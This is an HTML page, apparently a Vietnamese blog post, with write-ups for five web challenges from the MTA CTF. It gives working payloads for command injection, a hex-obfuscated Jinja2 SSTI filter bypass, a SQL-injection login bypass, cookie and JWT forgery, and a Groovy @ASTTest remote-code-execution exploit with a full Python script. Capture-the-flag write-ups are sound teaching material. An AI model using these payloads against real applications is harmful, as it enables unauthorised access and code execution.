@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/p1c0L0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=p1c0L0.github.io/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>WEB MTA CTF | p1c0L0</title>
+<meta name="keywords" content="">
+<meta name="description" content="WRITEUP MTA CTF
+WEB
+Well-done
+
+
+
+Như ta thấy chall đã gợi ý là dùng ping tool
+Ta sẽ thử ping 127.0.0.1; ls để xem phía server có phản hồi không
+
+Từ đây ta thấy được 1 file tên là flag.txt ở root /
+=&gt; Dùng cat /flag.txt để đọc file
+
+
+FLAG: MSEC{So_3asY_4_F1RsT_Ch4ll}
+Hello World
+
+
+
+
+Nhập thử vào ô Your name rồi xem phản hồi của web
+">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/web-mta-ctf/">
+<link crossorigin="anonymous" href="/p1c0L0.github.io/assets/css/stylesheet.76a739ec9e19c0128deb6be5591d168c8e3b9a8640e14dc34a2f248f674ef884.css" integrity="sha256-dqc57J4ZwBKN62vlWR0WjI47moZA4U3DSi8kj2dO&#43;IQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/p1c0L0.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/p1c0L0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/p1c0L0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/p1c0L0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/p1c0L0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/web-mta-ctf/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="icon" type="image/png" sizes="32x32" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="shortcut icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="apple-touch-icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/p1c0L0.github.io/" accesskey="h" title="p1c0L0 (Alt + H)">p1c0L0</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/ctf/" title="CTF">
+                    <span>CTF</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      WEB MTA CTF
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="writeup-mta-ctf">WRITEUP MTA CTF<a hidden class="anchor" aria-hidden="true" href="#writeup-mta-ctf">#</a></h1>
+<h1 id="web">WEB<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h1>
+<h2 id="well-done">Well-done<a hidden class="anchor" aria-hidden="true" href="#well-done">#</a></h2>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/H12h_2kLWx.png"></p>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HyMauh1I-g.png"></p>
+<ul>
+<li>Như ta thấy chall đã gợi ý là dùng ping tool</li>
+<li>Ta sẽ thử ping <code>127.0.0.1; ls</code> để xem phía server có phản hồi không</li>
+<li><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/B1HIYny8Ze.png"></li>
+<li>Từ đây ta thấy được 1 file tên là <code>flag.txt</code> ở root <code>/</code>
+=&gt; Dùng <code>cat /flag.txt</code> để đọc file
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJgCYn1IWe.png"></li>
+</ul>
+<p><strong>FLAG: MSEC{So_3asY_4_F1RsT_Ch4ll}</strong></p>
+<h2 id="hello-world">Hello World<a hidden class="anchor" aria-hidden="true" href="#hello-world">#</a></h2>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Bypmc31Ibl.png"></p>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJQEq2kIWe.png"></p>
+<ul>
+<li>
+<p>Nhập thử vào ô <code>Your name</code> rồi xem phản hồi của web
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HyKgbaJIZx.png"></p>
+</li>
+<li>
+<p>Khi nhập thử <code>abc</code> thì trả về như trong ảnh</p>
+</li>
+<li>
+<p>Bây giờ ta sẽ thử payload SSTI cơ bản để thám thính (<code>{{7*7}}</code>)</p>
+</li>
+<li>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJg4Z6JLWx.png">
+=&gt; Trả về <code>49</code> =&gt; SSTI</p>
+</li>
+<li>
+<p>Khi nhập payload để liệt kê các file thì trả về <code>Hacking detected! 🚨</code> =&gt; Web đã chặn payload khai thác flag</p>
+</li>
+<li>
+<p>Ta sẽ thử decode payload <code>{% print lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')|attr('\x67\x65\x74')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74')|attr('\x72\x65\x61\x64')() %}</code></p>
+</li>
+<li>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rklmjZpyLWg.png"></p>
+</li>
+<li>
+<p>Đã trả về được flag =&gt; done</p>
+</li>
+</ul>
+<p><strong>Flag: MSEC{W3ll-C3m00000-BaBy}</strong></p>
+<h2 id="chicken-guy">Chicken Guy<a hidden class="anchor" aria-hidden="true" href="#chicken-guy">#</a></h2>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJHJGTyUbx.png">
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SyFyGa1LWl.png"></p>
+<ul>
+<li>
+<p>Theo như mô tả của chall thì ta có thể nghĩ ngay là SQLi</p>
+</li>
+<li>
+<p>Để kiểm chứng ta sẽ thử nhập username là <code>admin'--</code> và password bất kỳ để thám thính</p>
+</li>
+<li>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1_8z61LZg.png"></p>
+</li>
+<li>
+<p>Thật bất ngờ là trả về được flag =&gt; suy nghĩ của ta đã đúng</p>
+</li>
+<li>
+<p>Lỗi SQLi dạng authentication bypass, khi nhập <code>admin'--</code> thì password ở đằng sau đã bị comment lại =&gt; Database chỉ thực thi đoạn <code>WHERE username = 'admin'</code>, điều kiện này luôn <code>TRUE</code> nếu user admin tồn tại</p>
+</li>
+</ul>
+<p><strong>Flag: MSEC{SQL_So_3aSy_4_YYYY}</strong></p>
+<h2 id="cve-2025-">CVE-2025-*****<a hidden class="anchor" aria-hidden="true" href="#cve-2025-">#</a></h2>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJXhHTyUWx.png">
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SkP5ETkL-l.png">
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1ziV61IWe.png"></p>
+<h3 id="phân-tích">Phân tích<a hidden class="anchor" aria-hidden="true" href="#phân-tích">#</a></h3>
+<h4 id="kiến-trúc">Kiến trúc<a hidden class="anchor" aria-hidden="true" href="#kiến-trúc">#</a></h4>
+<ul>
+<li>Next.js (app router)</li>
+<li>Authentication: sử dụng JSON Web Token (JWT)</li>
+</ul>
+<h4 id="middleware">Middleware<a hidden class="anchor" aria-hidden="true" href="#middleware">#</a></h4>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/S1NbBa1UWl.png"></p>
+<ul>
+<li>File <code>middleware.js</code> là proxy cho các request vào <code>/dashboard</code>
+<ul>
+<li>Kiểm tra cookie có tên là auth</li>
+<li>Nếu cookie không tồn tại hoặc giá trị không phải là <code>authenticated</code> thì user sẽ bị redirect về trang chủ <code>/</code></li>
+<li>Ta thấy nó chỉ check giá trị string của cookie mà không verify signature hay tính hợp lệ của session phía server</li>
+</ul>
+</li>
+</ul>
+<h4 id="target-endpoint">Target endpoint<a hidden class="anchor" aria-hidden="true" href="#target-endpoint">#</a></h4>
+<ul>
+<li>
+<p>File <code>app/api/flag/route.js</code> là nơi chứa flag <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJMlUpJI-e.png"></p>
+<ul>
+<li>Request phải có header <code>Authorization: Bearer &lt;token&gt;</code></li>
+<li>Token được verify bằng <code>process.env.SECRET_KEY</code></li>
+<li>Sau khi decode, payload của token phải có<code>role</code> là <code>admin</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="vuln">Vuln<a hidden class="anchor" aria-hidden="true" href="#vuln">#</a></h3>
+<ul>
+<li>Tại file <code>app/dashboard/page.js</code> có để lại một comment gợi ý <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJsLIT18-g.png"> về một endpoint ẩn <code>Hint: /api/s*****</code></li>
+<li>Middleware tin tưởng tuyệt đối vào input từ phía client (Cookie: <code>auth=authenticated</code>) =&gt; Ta có thể tự tạo cookie này để vượt qua lớp bảo vệ mà không cần login</li>
+<li>Ta truy cập được vào endpoint ẩn làm lộ <code>SECRET_KEY</code> thực sự của server</li>
+<li>Khi đã có <code>SECRET_KEY</code> ta có thể tự tạo bất kỳ token nào với quyền admin</li>
+</ul>
+<h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>
+<h4 id="recon--tìm-endpoint-ẩn">Recon &amp; tìm endpoint ẩn<a hidden class="anchor" aria-hidden="true" href="#recon--tìm-endpoint-ẩn">#</a></h4>
+<ul>
+<li>Dựa vào gợi ý trong <code>dashboard/page.js</code> là <code>/api/s*****</code>, ta đoán endpoint có thể là <code>/api/secret</code>, <code>/api/source</code>, hoặc <code>/api/status</code>. Khi truy cập thử <code>/api/secret</code> trên browser, server trả về <code>307</code> Redirect về trang chủ =&gt; chứng tỏ endpoint này TỒN TẠI nhưng đang bị chặn bởi Middleware
+(Ta có thể dùng fuzz để quét endpoint)</li>
+</ul>
+<h4 id="bypass-middleware">Bypass middleware<a hidden class="anchor" aria-hidden="true" href="#bypass-middleware">#</a></h4>
+<ul>
+<li>Để truy cập <code>api/secret</code>. ta cần lừa middleware bằng cách inject cookie</li>
+<li>Gửi request tới  <code>api/secret</code> với cookie <code>Cookie: auth=authenticated</code><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/H1j-_pk8Zg.png"></li>
+<li>Server trả về JSON chứa Secket thật: <code>&quot;secret_key&quot;:&quot;Anh-tung-dep-trai-vc&quot;</code> 🤡🤡🤡</li>
+</ul>
+<h4 id="tạo-admin-token-giả">Tạo admin token giả<a hidden class="anchor" aria-hidden="true" href="#tạo-admin-token-giả">#</a></h4>
+<ul>
+<li>
+<p>Sử dụng secret key vừa lấy được để tạo JWT Token để bypass check lại <code>api/flag/route.js</code></p>
+</li>
+<li>
+<p>Ta có thể dùng jwt.io để có thể tạo JWT token với:</p>
+<ul>
+<li>Header: <code>{&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;}</code></li>
+<li>Payload: <code>{&quot;role&quot;: &quot;admin&quot;}</code></li>
+<li>Signature: Ký bằng key <code>Anh-tung-dep-trai-vc</code></li>
+</ul>
+</li>
+<li>
+<p>Script python tạo token:</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Anh-tung-dep-trai-vc&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>}
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(payload, key, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>)
+</span></span><span style="display:flex;"><span>print(token)
+</span></span></code></pre></div><h4 id="lấy-flag">Lấy flag<a hidden class="anchor" aria-hidden="true" href="#lấy-flag">#</a></h4>
+<ul>
+<li>Gửi request cuối cùng tới endpoint <code>api/flag</code> trả về flag với token vừa tạo</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;success&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Congratulations!&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;flag&#34;</span>: <span style="color:#e6db74">&#34;MSEC{Bypass_proxy_so_izzzzz}&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Flag: MSEC{Bypass_proxy_so_izzzzz}</strong></p>
+<h2 id="jve-2025-">JVE-2025-*****<a hidden class="anchor" aria-hidden="true" href="#jve-2025-">#</a></h2>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/H1xA7A1L-g.png">
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/ryvvSR1I-l.png"></p>
+<h3 id="phân-tích-1">Phân tích<a hidden class="anchor" aria-hidden="true" href="#phân-tích-1">#</a></h3>
+<ul>
+<li>Theo <code>Dockerfile</code> và <code>pom.xml</code>
+<ul>
+<li>
+<p>File flag nằm tại <code>/flag.txt</code> được tạo với quyền user <code>oim</code> (UID 1000) và permission <code>400</code> (chỉ owner đọc được) <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rJoMHC1UZx.png"></p>
+</li>
+<li>
+<p>Trong <code>pom.xml</code>, project sử dụng <code>groovy-all</code> v3.0.9 =&gt; đây là một thư viện script động, thường là vector tấn công nếu bị khai thác ko an toàn</p>
+</li>
+</ul>
+</li>
+<li>Cơ chế bảo mật <code>SecurityFilter.java</code>
+<ul>
+<li>Ứng dụng sử dụng 1 filter tự viết là <code>SecurityFilter</code></li>
+<li>Filter này chặn hầu hết các request không xác thực, ngoại trừ các endpoint công khai như <code>/login</code>, <code>/static</code></li>
+<li>Nếu user đăng nhạp (session <code>authenticated</code> là null hoặc false) request sẽ bị trả về lỗi 401</li>
+</ul>
+</li>
+<li>Endpoint chức năng (<code>GroovyCompilationController.java</code>)
+<ul>
+<li>Controller này nằm ở <code>/iam/governance/applicationmanagement/api/v1/applications</code></li>
+<li>Có endpoint <code>/groovyscriptstatus</code> nhận một đoạn script groovy từ JSON body và thực hiện biên dịch</li>
+</ul>
+</li>
+</ul>
+<h3 id="vuln-1">Vuln<a hidden class="anchor" aria-hidden="true" href="#vuln-1">#</a></h3>
+<h4 id="authentication-bypass">Authentication bypass<a hidden class="anchor" aria-hidden="true" href="#authentication-bypass">#</a></h4>
+<ul>
+<li>
+<p>Tại file <code>SecurityFilter.java</code> logic kiểm tra quyền truy cập một blackdoor dàn cho mục đích debug hoặc legacy support<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rkCJvCJ8-x.png"></p>
+</li>
+<li>
+<p>Đoạn code trên kiểm tra nếu URL có chứa query string là <code>WSDL</code> (không phân biệt hoa thường) filter sẽ cho phép request đi qua mà không kiểm tra session =&gt; Ta có thể truy cập bất kỳ API nào (kể cả admin) chỉ bằng cách thêm <code>?WSDL</code> vào cuối URL</p>
+</li>
+</ul>
+<h4 id="rce-via-groovy">RCE via groovy<a hidden class="anchor" aria-hidden="true" href="#rce-via-groovy">#</a></h4>
+<ul>
+<li>
+<p>Tại <code>GroovyCompilationController.java</code>, endpoint <code>/groovyscriptstatus</code> xử lý input của user như sau: <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/H1sjwA1UWg.png"></p>
+<ul>
+<li>Hàm <code>loader.parseClass(groovyScript)</code> biên dịch chuỗi string thành Java Class</li>
+<li>Mặc dù chỉ là biên dịch nhưng ngôn ngữ groovy có tính năng meta-programming mạnh, ta có thể sử dụng annotation <code>@ASTTest </code> hoặc <code>@Grab</code> để explopit code ngay trong quá trình biên dịch mà không cần đợi class đó được khởi tạo hay gọi hàm</li>
+<li>Kết hợp với việc ứng dụng trả về <code>Exception message</code> khi có lỗi, ta có thể leak được output của lệnh thực thi</li>
+</ul>
+</li>
+</ul>
+<h3 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h3>
+<h4 id="xác-định">Xác định<a hidden class="anchor" aria-hidden="true" href="#xác-định">#</a></h4>
+<ul>
+<li>Target là endpoint biên dịch Groovy, nhưng đi kèm với bypass auth
+<ul>
+<li>Url: <code>http://localhost:14000/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus?WSDL</code></li>
+<li>Method: <code>POST</code></li>
+<li>Content-type: <code>application/json</code>
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/B173OA1UWx.png"></li>
+</ul>
+</li>
+</ul>
+<h4 id="payload">Payload<a hidden class="anchor" aria-hidden="true" href="#payload">#</a></h4>
+<ul>
+<li>Ta sẽ sử dụng AST Transformation của Groovy để exploit lệnh hệ thống <code>cat /flag.txt</code></li>
+<li>Vì server chỉ trả về <code>error</code> message khi có exception =&gt; ta sẽ throw một exception chứa kết quả của lệnh cat
+<strong>Payload Groovy:</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@groovy.transform.ASTTest</span>(value<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// lệnh đọc flag</span>
+</span></span><span style="display:flex;"><span>    def proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cat /flag.txt&#34;</span>.<span style="color:#a6e22e">execute</span>()
+</span></span><span style="display:flex;"><span>    proc.<span style="color:#a6e22e">waitFor</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Lấy kết quả trả về</span>
+</span></span><span style="display:flex;"><span>    def output <span style="color:#f92672">=</span> proc.<span style="color:#a6e22e">in</span>.<span style="color:#a6e22e">text</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Ném lỗi chứa flag để server trả về trong JSON response</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#66d9ef">false</span> : <span style="color:#e6db74">&#34;Flag: &#34;</span> <span style="color:#f92672">+</span> output
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>def x
+</span></span></code></pre></div><h4 id="gửi-request">Gửi request<a hidden class="anchor" aria-hidden="true" href="#gửi-request">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html\" data-lang="html\"><span style="display:flex;"><span>curl -X POST &#34;http://ctf.msec.cloud-ip.cc:14000/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus?WSDL&#34; \
+</span></span><span style="display:flex;"><span>     -H &#34;Content-Type: application/json&#34; \
+</span></span><span style="display:flex;"><span>     -d &#39;{
+</span></span><span style="display:flex;"><span>           &#34;groovyScript&#34;: &#34;@groovy.transform.ASTTest(value={ assert false : \&#34;RESULT:\&#34; + \&#34;cat /flag.txt\&#34;.execute().text }) class Pwn {}&#34;
+</span></span><span style="display:flex;"><span>         }&#39;
+</span></span></code></pre></div><h4 id="lấy-flag-1">Lấy flag<a hidden class="anchor" aria-hidden="true" href="#lấy-flag-1">#</a></h4>
+<ul>
+<li>Server sẽ cố gắng biên dịch script. <code>@ASTTest</code> sẽ kích hoạt  <code>cat /flag.txt</code>. Sau đó <code>assert false</code> sẽ gây ra lỗi biên dịch, và nội dung lỗi (chứa flag) sẽ được <code>GroovyCompilationController</code> bắt lại và trả về trong field <code>error</code> hoặc <code>output</code></li>
+</ul>
+<h3 id="full-script">FULL SCRIPT:<a hidden class="anchor" aria-hidden="true" href="#full-script">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Target Configuration</span>
+</span></span><span style="display:flex;"><span>BASE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:14000&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Endpoint vulnerable to RCE, protected by Auth</span>
+</span></span><span style="display:flex;"><span>VULN_PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [!] Exploit Logic</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. Bypass Auth: Append ?WSDL</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. RCE: Use Groovy @ASTTest to execute command at compile time</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. Exfil: Throw result in an assertion error to see it in the response</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BASE_URL<span style="color:#e6db74">}{</span>VULN_PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">?WSDL&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Target: </span><span style="color:#e6db74">{</span>target_url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Payload: Read /flag.txt which is set in Dockerfile</span>
+</span></span><span style="display:flex;"><span>groovy_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">@groovy.transform.ASTTest(value={
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    def proc = &#34;cat /flag.txt&#34;.execute()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    proc.waitFor()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // Throw exception to leak output in the JSON response
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    throw new RuntimeException(&#34;EXPLOIT_OUTPUT: &#34; + proc.in.text)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">})
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">class Pwn </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/json&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;groovyScript&#34;</span>: groovy_payload
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Sending malicious Groovy payload...&#34;</span>)
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(target_url, json<span style="color:#f92672">=</span>data, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Parse output</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>        json_resp <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;output&#34;</span> <span style="color:#f92672">in</span> json_resp <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;EXPLOIT_OUTPUT&#34;</span> <span style="color:#f92672">in</span> json_resp[<span style="color:#e6db74">&#34;output&#34;</span>]:
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Extract flag from stack trace or error message</span>
+</span></span><span style="display:flex;"><span>            raw_output <span style="color:#f92672">=</span> json_resp[<span style="color:#e6db74">&#34;output&#34;</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>            flag <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;MSEC\{.*?\}&#34;</span>, raw_output)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> flag:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[SUCCESS] FLAG FOUND: </span><span style="color:#e6db74">{</span>flag<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[!] Output found but no flag format:&#34;</span>)
+</span></span><span style="display:flex;"><span>                print(raw_output)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">in</span> json_resp:
+</span></span><span style="display:flex;"><span>             print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[!] Error from server: </span><span style="color:#e6db74">{</span>json_resp[<span style="color:#e6db74">&#39;error&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>             <span style="color:#75715e"># Check if flag is in error message</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;MSEC{&#34;</span> <span style="color:#f92672">in</span> json_resp[<span style="color:#e6db74">&#39;error&#39;</span>]:
+</span></span><span style="display:flex;"><span>                 print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[SUCCESS] FLAG FOUND in Error: </span><span style="color:#e6db74">{</span>json_resp[<span style="color:#e6db74">&#39;error&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[?] Unexpected response:&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(json_resp)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Request failed. Status: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(response<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
